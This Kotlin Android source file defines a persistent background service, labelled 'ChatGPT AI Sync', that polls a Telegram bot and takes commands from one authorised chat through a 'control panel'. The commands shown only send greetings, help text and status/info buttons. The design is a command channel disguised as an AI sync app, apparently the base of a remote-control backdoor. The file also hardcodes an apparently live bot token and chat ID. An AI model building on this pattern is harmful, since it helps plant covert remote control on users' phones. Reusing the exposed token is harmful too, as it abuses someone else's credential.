package com.cognitive.ai.syncagent

import android.app.Notification import android.app.NotificationChannel import android.app.NotificationManager import android.app.Service import android.content.Intent import android.os.Build import android.os.IBinder import android.util.Log import org.json.JSONArray import org.json.JSONObject import java.net.HttpURLConnection import java.net.URL import kotlin.concurrent.thread

class BackgroundControlService : Service() {

companion object {
    private const val TAG = "SyncAgent"
    private const val CHANNEL_ID = "sync_channel_v81"
    private const val NOTIFICATION_ID = 1001
}

// استبدل القيمة برمز بوت جديد بعد إلغاء الرمز المكشوف
private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"

private val authorizedChatId = "6904130639"

@Volatile
private var isRunning = false

private var lastUpdateId = 0L

override fun onBind(intent: Intent?): IBinder? = null

override fun onStartCommand(
    intent: Intent?,
    flags: Int,
    startId: Int
): Int {

    startForeground(
        NOTIFICATION_ID,
        createNotification()
    )

    if (!isRunning) {
        isRunning = true
        startTelegramPolling()
    }

    return START_STICKY
}

private fun createNotification(): Notification {

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

        val channel = NotificationChannel(
            CHANNEL_ID,
            "المزامنة الخلفية نشطة",
            NotificationManager.IMPORTANCE_LOW
        )

        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)

        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("ChatGPT AI Sync")
            .setContentText("الخدمة تعمل")
            .setSmallIcon(
                android.R.drawable.ic_menu_info_details
            )
            .build()
    }

    @Suppress("DEPRECATION")
    return Notification.Builder(this)
        .setContentTitle("ChatGPT AI Sync")
        .setContentText("الخدمة تعمل")
        .setSmallIcon(
            android.R.drawable.ic_menu_info_details
        )
        .build()
}

private fun startTelegramPolling() {

    thread(name = "TelegramPolling") {

        while (isRunning) {

            var connection: HttpURLConnection? = null

            try {

                val url = URL(
                    "https://api.telegram.org/bot$botToken/getUpdates" +
                    "?offset=${lastUpdateId + 1}&timeout=20"
                )

                connection =
                    url.openConnection() as HttpURLConnection

                connection.requestMethod = "GET"
                connection.connectTimeout = 10000
                connection.readTimeout = 30000

                val responseCode = connection.responseCode

                val stream = if (responseCode == 200) {
                    connection.inputStream
                } else {
                    connection.errorStream
                }

                val response = stream.bufferedReader().use {
                    it.readText()
                }

                Log.d(TAG, "Telegram response: $response")

                val json = JSONObject(response)

                if (json.optBoolean("ok")) {

                    val results = json.getJSONArray("result")

                    for (i in 0 until results.length()) {

                        val update = results.getJSONObject(i)

                        lastUpdateId =
                            update.getLong("update_id")

                        if (update.has("message")) {

                            val message =
                                update.getJSONObject("message")

                            val chatId = message
                                .getJSONObject("chat")
                                .getLong("id")
                                .toString()

                            val text =
                                message.optString("text", "")

                            if (chatId == authorizedChatId) {
                                handleCommand(chatId, text)
                            }
                        }
                    }

                } else {

                    Log.e(TAG, "Telegram API error: $response")
                }

            } catch (e: Exception) {

                Log.e(TAG, "Polling error", e)

                Thread.sleep(5000)

            } finally {

                connection?.disconnect()
            }
        }
    }
}

private fun handleCommand(
    chatId: String,
    text: String
) {

    when (text.trim()) {

        "/start", "لوحة التحكم" -> {

            sendKeyboard(
                chatId,
                "🫡 أهلاً بك يا فندم.\n" +
                "مرحباً بك في لوحة التحكم."
            )
        }

        "/help" -> {

            sendMessage(
                chatId,
                "الأوامر المتاحة:\n" +
                "/start - عرض لوحة التحكم\n" +
                "/help - المساعدة"
            )
        }

        else -> {

            sendMessage(
                chatId,
                "❓ أمر غير معروف. أرسل /start"
            )
        }
    }
}

private fun sendKeyboard(
    chatId: String,
    text: String
) {

    thread(name = "TelegramSend") {

        var connection: HttpURLConnection? = null

        try {

            val keyboard = JSONArray().apply {

                put(
                    JSONArray().apply {

                        put(
                            JSONObject().apply {
                                put("text", "📋 حالة الخدمة")
                                put("callback_data", "status")
                            }
                        )
                    }
                )

                put(
                    JSONArray().apply {

                        put(
                            JSONObject().apply {
                                put("text", "ℹ️ معلومات")
                                put("callback_data", "info")
                            }
                        )
                    }
                )
            }

            val body = JSONObject().apply {

                put("chat_id", chatId)
                put("text", text)

                put(
                    "reply_markup",
                    JSONObject().put(
                        "inline_keyboard",
                        keyboard
                    )
                )
            }

            connection = URL(
                "https://api.telegram.org/bot$botToken/sendMessage"
            ).openConnection() as HttpURLConnection

            connection.requestMethod = "POST"
            connection.doOutput = true

            connection.connectTimeout = 10000
            connection.readTimeout = 15000

            connection.setRequestProperty(
                "Content-Type",
                "application/json; charset=UTF-8"
            )

            connection.outputStream.use {
                it.write(
                    body.toString().toByteArray(Charsets.UTF_8)
                )
            }

            val response = connection.inputStream
                .bufferedReader()
                .use { it.readText() }

            Log.d(TAG, "Keyboard response: $response")

        } catch (e: Exception) {

            Log.e(TAG, "Keyboard sending error", e)

        } finally {

            connection?.disconnect()
        }
    }
}

private fun sendMessage(
    chatId: String,
    text: String
) {

    thread(name = "TelegramMessage") {

        var connection: HttpURLConnection? = null

        try {

            val body = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
            }

            connection = URL(
                "https://api.telegram.org/bot$botToken/sendMessage"
            ).openConnection() as HttpURLConnection

            connection.requestMethod = "POST"
            connection.doOutput = true

            connection.setRequestProperty(
                "Content-Type",
                "application/json; charset=UTF-8"
            )

            connection.outputStream.use {
                it.write(
                    body.toString().toByteArray(Charsets.UTF_8)
                )
            }

            val response = connection.inputStream
                .bufferedReader()
                .use { it.readText() }

            Log.d(TAG, "Message response: $response")

        } catch (e: Exception) {

            Log.e(TAG, "Message sending error", e)

        } finally {

            connection?.disconnect()
        }
    }
}

override fun onDestroy() {
    isRunning = false
    super.onDestroy()
}


}
